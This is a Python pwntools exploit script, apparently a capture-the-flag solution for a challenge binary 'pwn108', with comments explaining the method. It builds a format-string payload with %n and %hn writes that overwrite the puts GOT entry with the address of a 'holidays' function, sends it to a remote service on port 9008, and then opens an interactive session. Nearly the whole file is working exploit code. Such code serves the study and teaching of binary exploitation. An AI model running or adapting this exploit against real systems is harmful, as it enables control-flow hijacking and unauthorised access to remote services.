from pwn import *

elf = context.binary = ELF('./pwn108.pwn108')

MACHINE_IP = ''		# Change this
PORT = 9008

p = remote(MACHINE_IP, PORT)
#p = process()

# input is at position 10

# value to write = desired value - bytes written so far
# holidays 0x40123b
# we must split our bytes because the server can't handle so much data
# we first write 0x40 two bytes higher overwriting the middle 4 bytes of the address, then 0x123b after them in the approriate address but writing only two bytes to not overwrite the previous

# 1st write = (0x40) 64 - 0 = 64
# 2nd write = (0x123b) 4667 - 64 = 4603

# read saves the these five values(look at the bytes portions of 8) at positions 10 11 12 13 14 accordingly
# when printf calls with the payload it only prints until the \x00 contained in the first elf got puts address but we don't care about that because read already saved the address

# En bref:
# read saves the addresses 
# printf uses %{position}$n to write at the two addresses. It writes the value before it in the string as hex into the address of puts that we splitted in order to not crash the program with big numbers
payload = b'%64X%13$n' + b'%4603X%14$hnAAA' + p64(elf.got.puts+2) + p64(elf.got.puts)

junk = b'A'*0x12
write('payload', junk + payload)
p.send(junk)
p.send(payload)
p.interactive()


